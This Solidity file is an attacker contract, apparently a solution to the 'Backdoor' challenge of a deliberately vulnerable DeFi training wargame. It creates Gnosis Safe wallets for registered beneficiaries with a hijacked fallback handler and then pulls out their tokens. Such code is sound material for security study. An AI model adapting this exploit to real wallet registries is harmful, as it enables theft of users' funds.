// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {IProxyCreationCallback} from "gnosis/proxies/IProxyCreationCallback.sol";

interface IGnosisSafe {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}

contract Attacker {
    address proxyFactory;
    address token;
    address registry;

    constructor(address proxyFactoryAddress, address tokenAddress, address registryAddress) {
        proxyFactory = proxyFactoryAddress;
        token = tokenAddress;
        registry = registryAddress;
    }

    function callCreateProxyWithCallback(address masterCopy, address[] memory beneficiary) external {
        for (uint256 i = 0; i < beneficiary.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = beneficiary[i];
            bytes memory initializer = abi.encodeWithSelector(
                IGnosisSafe.setup.selector, owners, 1, address(0x0), 0x0, token, address(0x0), 0, address(0x0)
            );

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(proxyFactory).createProxyWithCallback(
                masterCopy, initializer, 0, IProxyCreationCallback(registry)
            );

            DamnValuableToken(address(proxy)).transfer(msg.sender, 10e18);
        }
    }
}
